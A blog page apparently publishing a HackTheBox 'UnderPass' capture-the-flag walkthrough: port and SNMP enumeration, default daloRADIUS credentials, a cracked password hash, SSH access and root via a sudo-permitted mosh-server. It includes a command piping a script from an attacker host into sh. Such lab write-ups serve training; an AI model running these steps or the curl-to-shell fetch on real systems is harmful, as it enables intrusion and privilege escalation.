@@ -1,0 +1,1101 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox UnderPass - Dcodezero</title>
+<meta name="description" content="UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox UnderPass">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Underpass/">
+
+
+  <meta property="og:description" content="UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/sample/Underpass/underpass.jpg">
+
+
+
+  <meta name="twitter:site" content="@Dcodezer0">
+  <meta name="twitter:title" content="HackTheBox UnderPass">
+  <meta name="twitter:description" content="UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.">
+  <meta name="twitter:url" content="http://localhost:4000/hackthebox/Underpass/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="http://localhost:4000/assets/images/sample/Underpass/underpass.jpg">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2025-01-10T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Underpass/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/a236ffe3231543dfa1a53e2a4/b8e03e16b2df243b196811790.js");</script>
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Subscribe</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/images/sample/Underpass/underpass.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox UnderPass
+
+        
+      </h1>
+      
+        <p class="page__lead">UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2025-01-10T00:00:00+05:30">January 10, 2025</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox UnderPass</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox UnderPass">
+    <meta itemprop="description" content="UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.">
+    <meta itemprop="datePublished" content="2025-01-10T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#nmap-scan">Nmap scan:</a></li><li><a href="#trying-dirby">Trying Dirby:</a><ul><li><a href="#udp-enumeration">UDP Enumeration:</a><ul><li><a href="#default-creds">Default Creds:</a></li></ul></li></ul></li><li><a href="#privilege-escalation">Privilege escalation:</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h3 id="nmap-scan">Nmap scan:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:49 PST
+Nmap scan report for 10.10.11.48
+Host is up (0.047s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.56 seconds
+
+</code></pre></div></div>
+
+<h3 id="trying-dirby">Trying Dirby:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ dirb http://10.10.11.48   
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jan  8 22:51:43 2025
+URL_BASE: http://10.10.11.48/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.11.48/ ----
++ http://10.10.11.48/index.html (CODE:200|SIZE:10671)                                                                                                                          
++ http://10.10.11.48/server-status (CODE:403|SIZE:276)                                                                                                                         
+-----------------
+END_TIME: Wed Jan  8 22:56:03 2025
+DOWNLOADED: 4612 - FOUND: 2
+
+</code></pre></div></div>
+
+<p>Found noting intresting so far. Quickly checking with a UDP scan using nmap</p>
+
+<h4 id="udp-enumeration">UDP Enumeration:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ sudo nmap -sU --top-ports 100 10.10.11.48 
+[sudo] password for kali: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:59 PST
+Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 10.25% done; ETC: 23:00 (0:00:35 remaining)
+Nmap scan report for 10.10.11.48
+Host is up (0.20s latency).
+Not shown: 97 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+161/udp  open          snmp
+1812/udp open|filtered radius
+1813/udp open|filtered radacct
+
+Nmap done: 1 IP address (1 host up) scanned in 130.06 seconds
+</code></pre></div></div>
+
+<p>Found that port number 161 is open with service SNMP:</p>
+
+<p>Next will be using a MSFs aux scanner for SNMP enum:</p>
+
+<p><img src="/assets/images/sample/Underpass/1.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/2.png" alt="1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] 10.10.11.48, Connected.
+
+[*] System information:
+
+Host IP                       : 10.10.11.48
+Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
+Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+Contact                       : steve@underpass.htb
+Location                      : Nevada, U.S.A. but not Vegas
+Uptime snmp                   : 11:03:16.58
+Uptime system                 : 11:03:06.35
+System date                   : 2025-1-9 06:48:46.0
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre></div></div>
+
+<p>From the above Information, we can observe that there is a host name related to some thing to <code class="language-plaintext highlighter-rouge">daloradious</code>.</p>
+
+<p>Exploring more about on this, I quickly came to understand that daloradius is a framework for deployment of FreeRADIUS servers.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Remote Authentication Dial-In User Service is a networking protocol that provides centralized authentication, authorisation, and accounting management for users who connect and use a network service.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>If we look at the git repo, we can observe that there are multiple folders which contain details to more pages which contain some login pages.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Users</code>
+<code class="language-plaintext highlighter-rouge">Operators</code>
+<code class="language-plaintext highlighter-rouge">common</code></p>
+
+<p>So navigating to the paths will lang to the login page.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://underpass.htb/daloradius/app/users/login.php
+2. http://underpass.htb/daloradius/app/operators/login.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/sample/Underpass/3.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/4.png" alt="1.png" /></p>
+
+<p>Now, I’ll quickly check the if I can access that directory of that name.</p>
+
+<h5 id="default-creds">Default Creds:</h5>
+
+<p>The default creds can be found from the wiki doc below:</p>
+
+<p>https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</p>
+
+<p>Use the default creds against the machine will grant the login access.</p>
+
+<p>Note: The creds will only work with the URL with /operators/</p>
+
+<p><img src="/assets/images/sample/Underpass/6.png" alt="1.png" /></p>
+
+<p>After login, we can navigate to the user management and check for other users in the application, by navigating to the top right corner of the web app.</p>
+
+<p><img src="/assets/images/sample/Underpass/7.png" alt="1.png" /></p>
+
+<p>Username: svcMosh
+HASH: 412DD4759978ACFCC81DEAB01B382403</p>
+
+<p>Using crack station to crack the hash of the users.</p>
+
+<p><img src="/assets/images/sample/Underpass/8.png" alt="1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: svcMosh
+Password: underwaterfriends
+</code></pre></div></div>
+
+<p>Now, login via ssh with the compromised username and password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh svcMosh@underpass.htb
+The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
+ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
+svcMosh@underpass.htb's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Jan  9 08:26:01 AM UTC 2025
+
+  System load:  0.68              Processes:             249
+  Usage of /:   90.8% of 3.75GB   Users logged in:       1
+  Memory usage: 18%               IPv4 address for eth0: 10.10.11.48
+  Swap usage:   0%
+
+  =&gt; / is using 90.8% of 3.75GB
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Jan  9 08:18:47 2025 from 10.10.14.42
+svcMosh@underpass:~$ ls
+user.txt
+svcMosh@underpass:~$ cat user.txt 
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege escalation:</h3>
+
+<p>The traditional way to search for privilege escalation technique is by using linpeas.sh</p>
+
+<p>Link: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</p>
+
+<p><code class="language-plaintext highlighter-rouge">svcMosh@underpass:~$ curl -L http://10.10.14.13:8000/linpeas.sh | sh</code></p>
+
+<p>The other way around to check privileages to check by using <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/sample/Underpass/9.png" alt="1.png" /></p>
+
+<p>The line <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /usr/bin/mosh-server</code> is typically part of a <code class="language-plaintext highlighter-rouge">sudoers</code> configuration file. It specifies permissions for the <code class="language-plaintext highlighter-rouge">sudo</code> command and determines how certain users or groups can execute specific commands with elevated privileges.</p>
+
+<p>The above basically means that, this line appears in the <code class="language-plaintext highlighter-rouge">sudoers</code> file (edited with <code class="language-plaintext highlighter-rouge">visudo</code>), a user could run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/mosh-server
+</code></pre></div></div>
+
+<p>Now execute the below command to connect to local host and gain root access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mosh --server="sudo /usr/bin/mosh-server" localhost
+</code></pre></div></div>
+<p><img src="/assets/images/sample/Underpass/11.png" alt="1.png" /></p>
+
+<p><img src="/assets/images/sample/Underpass/10.png" alt="1.png" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item p-category" rel="tag">HTB</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item p-category" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2025-01-10T00:00:00+05:30">January 10, 2025</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?via=Dcodezer0&text=HackTheBox+UnderPass%20%2Fhackthebox%2FUnderpass%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FUnderpass%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Underpass/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/red-team/Malleable-c2-pro/" class="pagination--pager" title="Cobalt Strike Malleable C2 Profiles">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+ 
+  
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+           <!-- Add this CSS to your custom stylesheet (_sass or assets/css/main.scss) -->
+   <style>
+    .subscribe-button {
+      display: inline-block;
+      padding: 12px 24px;
+      background: transparent;
+      border: 2px solid #39ff14;
+      color: #39ff14;
+      text-decoration: none;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: bold;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .subscribe-button:hover {
+      background: #39ff14;
+      color: #000;
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
+    }
+    
+    .subscribe-button::before {
+      content: '>';
+      margin-right: 8px;
+      display: inline-block;
+    }
+    
+    /* Optional: Add animation */
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(57, 255, 20, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0); }
+    }
+    
+    .subscribe-button {
+      animation: pulse 2s infinite;
+    }
+    </style>
+    
+    <!-- Add this HTML where you want the button to appear -->
+    <div style="text-align: center; margin: 30px 0;">
+      <a href="/helpedyou/" class="subscribe-button">Join The Network</a>
+    </div>
+
+<div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/Underpass/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Underpass"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+    
+  </body>
+</html>
